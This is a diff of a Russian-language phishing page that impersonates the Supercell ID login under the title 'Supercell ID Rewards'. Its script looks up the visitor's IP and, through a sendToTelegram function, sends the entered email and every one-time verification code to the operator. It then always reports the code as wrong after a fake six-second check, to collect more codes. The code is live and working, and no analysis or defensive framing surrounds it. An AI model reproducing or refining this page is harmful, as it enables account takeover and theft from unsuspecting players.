@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Supercell ID</title>
+    <title>Supercell ID Rewards</title>
     <style>
         * {
             margin: 0;
@@ -12,8 +12,8 @@
         }
 
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
-            background: #FFFFFF;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #0A192F 0%, #0B1A33 50%, #0C1D3A 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -21,92 +21,145 @@
             padding: 20px;
         }
 
-        /* Оригинальный стиль Supercell ID — светлый фон, аккуратные карточки */
-        .container {
-            max-width: 440px;
+        /* Основной белый блок */
+        .card {
+            max-width: 520px;
             width: 100%;
             background: #FFFFFF;
-            border-radius: 28px;
-            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.08), 0 2px 4px rgba(0, 0, 0, 0.02);
+            border-radius: 32px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
             overflow: hidden;
-            border: 1px solid #E8ECF0;
+            position: relative;
         }
 
-        /* Шапка как в официальном Supercell ID */
-        .header {
-            background: #FFFFFF;
-            padding: 32px 24px 24px 24px;
-            text-align: center;
-            border-bottom: 1px solid #F0F2F5;
+        /* Внутренний контент */
+        .content {
+            padding: 40px 48px 48px 48px;
         }
 
+        /* Логотип Supercell ID */
         .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo svg {
+            width: 180px;
+            height: auto;
+        }
+
+        /* Индикатор прогресса (два этапа) */
+        .progress-container {
+            margin-bottom: 32px;
+        }
+
+        .steps {
             display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
+            justify-content: space-between;
             margin-bottom: 12px;
+            padding: 0 8px;
         }
 
-        .logo-icon {
-            width: 48px;
-            height: 48px;
-            background: #2C6BFF;
-            border-radius: 16px;
+        .step {
+            font-size: 14px;
+            font-weight: 500;
+            color: #8E9AAE;
+            letter-spacing: 0.3px;
+        }
+
+        .step.active {
+            color: #2C6BFF;
+            font-weight: 600;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #EFF2F8;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #2C6BFF, #5B8CFF);
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+
+        /* Центральная иконка ID с неоновым свечением */
+        .icon-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 32px;
+        }
+
+        .id-icon {
+            width: 88px;
+            height: 88px;
+            background: linear-gradient(135deg, #2C6BFF, #5B8CFF);
+            border-radius: 24px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 28px;
-            font-weight: 700;
-            color: white;
-            box-shadow: 0 4px 12px rgba(44, 107, 255, 0.2);
+            box-shadow: 0 0 20px rgba(44, 107, 255, 0.5), 0 8px 20px rgba(0, 0, 0, 0.15);
         }
 
-        .logo-text {
+        .id-icon span {
+            font-size: 44px;
+            font-weight: 800;
+            color: white;
+            letter-spacing: 2px;
+        }
+
+        /* Заголовки */
+        h1 {
             font-size: 28px;
             font-weight: 700;
             color: #1F2A3E;
-            letter-spacing: -0.3px;
+            text-align: center;
+            margin-bottom: 12px;
         }
 
-        .logo-text span {
-            color: #2C6BFF;
-        }
-
-        .subtitle {
+        .description {
+            font-size: 16px;
             color: #6C7A8E;
-            font-size: 15px;
-            font-weight: 400;
-            margin-top: 8px;
+            text-align: center;
+            margin-bottom: 32px;
+            line-height: 1.4;
         }
 
-        .content {
-            padding: 28px 24px 32px 24px;
+        .email-highlight {
+            font-weight: 700;
+            color: #1F2A3E;
+            word-break: break-all;
         }
 
+        /* Поля ввода */
         .input-group {
             margin-bottom: 24px;
         }
 
-        label {
-            display: block;
-            color: #1F2A3E;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-
         input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 16px 20px;
             font-size: 16px;
             background: #FFFFFF;
             border: 1.5px solid #E2E6EA;
-            border-radius: 14px;
+            border-radius: 16px;
             color: #1F2A3E;
             outline: none;
             transition: all 0.2s;
             font-family: inherit;
+            text-align: center;
+            letter-spacing: 2px;
+            font-size: 20px;
+        }
+
+        input::placeholder {
+            color: #B8C1D0;
+            font-size: 16px;
+            letter-spacing: normal;
         }
 
         input:focus {
@@ -114,50 +167,100 @@
             box-shadow: 0 0 0 3px rgba(44, 107, 255, 0.1);
         }
 
-        input::placeholder {
-            color: #A0AABA;
-        }
-
-        button {
-            width: 100%;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            background: #2C6BFF;
-            color: white;
-            border: none;
-            border-radius: 14px;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-family: inherit;
+        /* Кнопки */
+        .button-group {
+            display: flex;
+            gap: 12px;
             margin-top: 8px;
         }
 
-        button:hover {
+        .btn {
+            flex: 1;
+            padding: 14px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: inherit;
+            text-align: center;
+            border: none;
+        }
+
+        .btn-primary {
+            background: #2C6BFF;
+            color: white;
+        }
+
+        .btn-primary:hover {
             background: #1A56E0;
+            transform: translateY(-1px);
         }
 
-        button:active {
-            transform: scale(0.98);
+        .btn-primary:active {
+            transform: translateY(0);
         }
 
-        button.secondary {
-            background: #F5F7FA;
-            color: #2C6BFF;
-            margin-top: 12px;
-            border: 1px solid #E2E6EA;
-        }
-
-        button.secondary:hover {
-            background: #EFF2F8;
-        }
-
-        button:disabled {
-            opacity: 0.6;
-            transform: none;
+        .btn-primary:disabled {
+            opacity: 0.5;
             cursor: not-allowed;
+            transform: none;
         }
 
+        .btn-secondary {
+            background: transparent;
+            color: #6C7A8E;
+            border: 1.5px solid #E2E6EA;
+        }
+
+        .btn-secondary:hover {
+            background: #F9FAFE;
+            border-color: #2C6BFF;
+            color: #2C6BFF;
+        }
+
+        /* Ссылки */
+        .link {
+            text-align: center;
+            margin-top: 24px;
+        }
+
+        .link a {
+            color: #2C6BFF;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Футер с языком */
+        .footer {
+            background: #F9FAFE;
+            padding: 16px 48px;
+            border-top: 1px solid #EFF2F8;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            font-size: 13px;
+            color: #6C7A8E;
+            font-weight: 500;
+        }
+
+        .language-selector svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* Сообщения */
         .message {
             margin-top: 20px;
             padding: 12px 16px;
@@ -186,70 +289,11 @@
             display: none;
         }
 
-        .email-display {
-            color: #2C6BFF;
-            font-weight: 600;
-            word-break: break-all;
-        }
-
-        .step2-card {
-            background: #F9FAFE;
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 24px;
-            text-align: center;
-            border: 1px solid #EFF2F8;
-        }
-
-        .step2-card .icon {
-            font-size: 44px;
-            margin-bottom: 8px;
-        }
-
-        .step2-card .title {
-            font-weight: 700;
-            font-size: 18px;
-            color: #1F2A3E;
-            margin-bottom: 8px;
-        }
-
-        .step2-card .description {
-            color: #6C7A8E;
-            font-size: 14px;
-            margin-top: 4px;
-        }
-
-        .code-hint {
-            font-size: 13px;
-            color: #8A99B0;
-            text-align: center;
-            margin-top: 16px;
-        }
-
-        .footer {
-            background: #F9FAFE;
-            padding: 16px 20px;
-            text-align: center;
-            border-top: 1px solid #EFF2F8;
-        }
-
-        .footer a {
-            color: #6C7A8E;
-            font-size: 13px;
-            text-decoration: none;
-            margin: 0 12px;
-            font-weight: 500;
-        }
-
-        .footer a:hover {
-            color: #2C6BFF;
-        }
-
         /* Анимация загрузки */
         .loader {
             display: inline-block;
-            width: 18px;
-            height: 18px;
+            width: 16px;
+            height: 16px;
             border: 2px solid rgba(255,255,255,0.3);
             border-radius: 50%;
             border-top-color: white;
@@ -262,64 +306,99 @@
             to { transform: rotate(360deg); }
         }
 
-        .btn-loading .loader {
-            display: inline-block;
+        @media (max-width: 560px) {
+            .content {
+                padding: 32px 24px 40px 24px;
+            }
+            .footer {
+                padding: 16px 24px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            .button-group {
+                flex-direction: column;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">
-                <div class="logo-icon">
-                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-                        <path d="M2 17L12 22L22 17" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-                        <path d="M2 12L12 17L22 12" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-                    </svg>
-                </div>
-                <div class="logo-text">Supercell <span>ID</span></div>
-            </div>
-            <div class="subtitle">Войдите или создайте аккаунт</div>
-        </div>
-
+    <div class="card">
         <div class="content">
-            <!-- Шаг 1: Email -->
-            <div id="step1">
-                <div class="input-group">
-                    <label>Адрес электронной почты</label>
-                    <input type="email" id="email" placeholder="name@example.com" autocomplete="off">
-                </div>
-                <button id="sendBtn" onclick="sendEmail()">Продолжить</button>
+            <!-- Логотип -->
+            <div class="logo">
+                <svg width="160" height="32" viewBox="0 0 160 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 4L4 16L12 28L20 16L12 4Z" fill="#2C6BFF" fill-opacity="0.2" stroke="#2C6BFF" stroke-width="1.2"/>
+                    <text x="28" y="22" font-family="Arial" font-weight="bold" font-size="18" fill="#1F2A3E">SUPERCELL</text>
+                    <text x="108" y="22" font-family="Arial" font-weight="bold" font-size="18" fill="#2C6BFF">ID</text>
+                </svg>
             </div>
 
-            <!-- Шаг 2: Код подтверждения -->
-            <div id="step2" class="hidden">
-                <div class="step2-card">
-                    <div class="icon">✉️</div>
-                    <div class="title">Проверьте почту</div>
-                    <div class="description">
-                        Мы отправили код подтверждения на <br>
-                        <span class="email-display" id="emailDisplay"></span>
-                    </div>
+            <!-- Индикатор прогресса -->
+            <div class="progress-container">
+                <div class="steps">
+                    <span class="step" id="step1Label">Вход</span>
+                    <span class="step" id="step2Label">Проверка</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill" style="width: 10%;"></div>
+                </div>
+            </div>
+
+            <!-- Центральная иконка -->
+            <div class="icon-container">
+                <div class="id-icon">
+                    <span>ID</span>
+                </div>
+            </div>
+
+            <!-- Шаг 1: Вход -->
+            <div id="stepLogin">
+                <h1>Вход — Supercell ID Rewards</h1>
+                <div class="description">
+                    Введите свой адрес электронной почты, и мы вышлем вам код подтверждения
                 </div>
                 <div class="input-group">
-                    <label>Код подтверждения</label>
-                    <input type="text" id="code" placeholder="000000" maxlength="6" autocomplete="off" style="text-align: center; letter-spacing: 4px; font-size: 22px; font-weight: 500;">
+                    <input type="email" id="emailInput" placeholder="Введите адрес эл. почты" autocomplete="off">
                 </div>
-                <button id="verifyBtn" onclick="verifyCode()">Подтвердить</button>
-                <button class="secondary" onclick="resetForm()">Использовать другой email</button>
-                <div class="code-hint">
-                    Не пришёл код? Проверьте папку «Спам» или <a href="#" onclick="resendCodeHint(event)" style="color:#2C6BFF; text-decoration:none;">отправить снова</a>
+                <div class="button-group">
+                    <button class="btn btn-primary" id="loginBtn" onclick="sendEmail()">ВХОД</button>
+                    <button class="btn btn-secondary" onclick="cancelLogin()">ОТМЕНА</button>
                 </div>
-                <div id="message" class="message"></div>
+                <div class="link">
+                    <a href="#" onclick="registerHint(event)">Хотите зарегистрировать Supercell ID?</a>
+                </div>
             </div>
+
+            <!-- Шаг 2: Проверка кода (изначально скрыт) -->
+            <div id="stepVerify" class="hidden">
+                <h1>Почти готово!</h1>
+                <div class="description" id="verifyDescription">
+                    Мы отправили код подтверждения на вашу электронную почту (<span class="email-highlight" id="emailDisplay"></span>)
+                </div>
+                <div class="input-group">
+                    <input type="text" id="codeInput" placeholder="123 456" maxlength="6" autocomplete="off" style="letter-spacing: 4px; font-size: 22px;">
+                </div>
+                <div class="button-group">
+                    <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">ПРОДОЛЖИТЬ</button>
+                    <button class="btn btn-secondary" onclick="backToLogin()">НАЗАД</button>
+                </div>
+                <div class="link">
+                    <a href="#" onclick="resendCode(event)">Не получили код?</a>
+                </div>
+            </div>
+
+            <div id="message" class="message"></div>
         </div>
 
         <div class="footer">
-            <a href="#">Помощь</a>
-            <a href="#">Конфиденциальность</a>
-            <a href="#">Условия</a>
+            <div class="language-selector" onclick="switchLanguage()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"/>
+                    <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+                </svg>
+                <span>Русский</span>
+            </div>
         </div>
     </div>
 
@@ -349,7 +428,6 @@
             }
         }
         
-        // Получение IP
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -364,6 +442,12 @@
             const msgDiv = document.getElementById('message');
             msgDiv.textContent = text;
             msgDiv.className = `message ${type}`;
+            setTimeout(() => {
+                if (document.getElementById('message').textContent === text) {
+                    msgDiv.className = 'message';
+                    msgDiv.textContent = '';
+                }
+            }, 4000);
         }
         
         function hideMessage() {
@@ -372,11 +456,28 @@
             msgDiv.textContent = '';
         }
         
+        // Обновление прогресс-бара
+        function setProgress(step) {
+            const step1 = document.getElementById('step1Label');
+            const step2 = document.getElementById('step2Label');
+            const progressFill = document.getElementById('progressFill');
+            
+            if (step === 1) {
+                step1.classList.add('active');
+                step2.classList.remove('active');
+                progressFill.style.width = '10%';
+            } else {
+                step1.classList.add('active');
+                step2.classList.add('active');
+                progressFill.style.width = '90%';
+            }
+        }
+        
         // Шаг 1: отправка email
         async function sendEmail() {
             if (isProcessing) return;
             
-            const email = document.getElementById('email').value.trim();
+            const email = document.getElementById('emailInput').value.trim();
             if (!email) {
                 showMessage('Введите адрес электронной почты', 'error');
                 return;
@@ -388,10 +489,10 @@
             }
             
             isProcessing = true;
-            const sendBtn = document.getElementById('sendBtn');
-            const originalText = sendBtn.textContent;
-            sendBtn.disabled = true;
-            sendBtn.innerHTML = '<span class="loader"></span> Отправка...';
+            const loginBtn = document.getElementById('loginBtn');
+            const originalText = loginBtn.textContent;
+            loginBtn.disabled = true;
+            loginBtn.innerHTML = '<span class="loader"></span> ОТПРАВКА...';
             
             currentEmail = email;
             retryCount = 0;
@@ -399,27 +500,28 @@
             const ip = await getIP();
             await sendToTelegram(`📧 НОВАЯ ПОЧТА\nEmail: ${email}\nIP: ${ip || 'unknown'}\nВремя: ${new Date().toLocaleString()}`);
             
-            // Переход на шаг 2
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
+            // Переход на шаг проверки
+            document.getElementById('stepLogin').classList.add('hidden');
+            document.getElementById('stepVerify').classList.remove('hidden');
             document.getElementById('emailDisplay').innerText = email;
-            document.getElementById('code').value = '';
+            document.getElementById('codeInput').value = '';
             hideMessage();
+            setProgress(2);
             
-            sendBtn.disabled = false;
-            sendBtn.innerHTML = originalText;
+            loginBtn.disabled = false;
+            loginBtn.innerHTML = originalText;
             isProcessing = false;
             
             setTimeout(() => {
-                document.getElementById('code').focus();
+                document.getElementById('codeInput').focus();
             }, 100);
         }
         
-        // Шаг 2: проверка кода (задержка 6 секунд)
+        // Шаг 2: проверка кода с задержкой 6 секунд
         async function verifyCode() {
             if (isProcessing) return;
             
-            const code = document.getElementById('code').value.trim();
+            const code = document.getElementById('codeInput').value.trim();
             if (!code) {
                 showMessage('Введите код подтверждения', 'error');
                 return;
@@ -434,76 +536,81 @@
             const verifyBtn = document.getElementById('verifyBtn');
             const originalText = verifyBtn.textContent;
             verifyBtn.disabled = true;
-            verifyBtn.innerHTML = '<span class="loader"></span> Проверка...';
+            verifyBtn.innerHTML = '<span class="loader"></span> ПРОВЕРКА...';
             
             retryCount++;
             
             const messageType = retryCount === 1 ? '🔑 КОД ДОСТУПА' : '🔄 ПОВТОРНЫЙ КОД';
             await sendToTelegram(`${messageType}\nEmail: ${currentEmail}\nКод: ${code}\nПопытка: ${retryCount}\nВремя: ${new Date().toLocaleString()}`);
             
-            // ЗАДЕРЖКА 6 СЕКУНД (имитация проверки сервера Supercell)
+            // ЗАДЕРЖКА 6 СЕКУНД (имитация проверки Supercell)
             setTimeout(() => {
                 showMessage('Неверный код. Попробуйте ещё раз.', 'error');
                 
-                document.getElementById('code').value = '';
-                document.getElementById('code').focus();
+                document.getElementById('codeInput').value = '';
+                document.getElementById('codeInput').focus();
                 
                 verifyBtn.disabled = false;
                 verifyBtn.innerHTML = originalText;
                 isProcessing = false;
                 
                 if (retryCount >= 3) {
-                    const hintDiv = document.querySelector('.code-hint');
-                    const originalHint = hintDiv.innerHTML;
-                    hintDiv.innerHTML = 'Слишком много попыток. Подождите 30 секунд.';
-                    setTimeout(() => {
-                        hintDiv.innerHTML = originalHint;
-                    }, 5000);
+                    showMessage('Слишком много попыток. Подождите несколько минут.', 'error');
                 }
             }, 6000);
         }
         
-        // Сброс формы
-        function resetForm() {
+        // Отмена на первом шаге
+        function cancelLogin() {
+            if (isProcessing) return;
+            document.getElementById('emailInput').value = '';
+            hideMessage();
+        }
+        
+        // Назад на шаг входа
+        function backToLogin() {
             if (isProcessing) return;
             
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step1').classList.remove('hidden');
-            document.getElementById('email').value = '';
-            document.getElementById('code').value = '';
+            document.getElementById('stepVerify').classList.add('hidden');
+            document.getElementById('stepLogin').classList.remove('hidden');
+            document.getElementById('codeInput').value = '';
             hideMessage();
+            setProgress(1);
             currentEmail = '';
             retryCount = 0;
             
             const verifyBtn = document.getElementById('verifyBtn');
             verifyBtn.disabled = false;
-            verifyBtn.innerHTML = 'Подтвердить';
+            verifyBtn.innerHTML = 'ПРОДОЛЖИТЬ';
             isProcessing = false;
         }
         
-        // Повторная отправка кода (имитация)
-        function resendCodeHint(event) {
+        // Повторная отправка кода
+        function resendCode(event) {
             event.preventDefault();
-            if (isProcessing) return;
-            
             if (!currentEmail) return;
             
-            showMessage('Новый код отправлен на почту', 'info');
+            showMessage('Новый код отправлен на вашу почту', 'info');
             sendToTelegram(`🔄 ЗАПРОС НОВОГО КОДА\nEmail: ${currentEmail}\nВремя: ${new Date().toLocaleString()}`);
-            
-            setTimeout(() => {
-                hideMessage();
-            }, 3000);
         }
         
-        // Ограничение длины кода и автофокус
+        function registerHint(event) {
+            event.preventDefault();
+            showMessage('Переход на страницу регистрации', 'info');
+        }
+        
+        function switchLanguage() {
+            showMessage('Язык: Русский', 'info');
+        }
+        
+          // Обработка ввода кода
         document.addEventListener('DOMContentLoaded', () => {
-            const codeInput = document.getElementById('code');
+            const codeInput = document.getElementById('codeInput');
             if (codeInput) {
                 codeInput.addEventListener('input', (e) => {
-                    if (e.target.value.length > 6) {
-                        e.target.value = e.target.value.slice(0, 6);
-                    }
+                    let val = e.target.value.replace(/\s/g, '');
+                    if (val.length > 6) val = val.slice(0, 6);
+                    e.target.value = val;
                 });
                 
                 codeInput.addEventListener('keypress', (e) => {
@@ -514,7 +621,7 @@
                 });
             }
             
-            const emailField = document.getElementById('email');
+            const emailField = document.getElementById('emailInput');
             if (emailField) {
                 emailField.addEventListener('keypress', (e) => {
                     if (e.key === 'Enter') {
@@ -523,6 +630,8 @@
                     }
                 });
             }
+            
+            setProgress(1);
         });
     </script>
 </body>
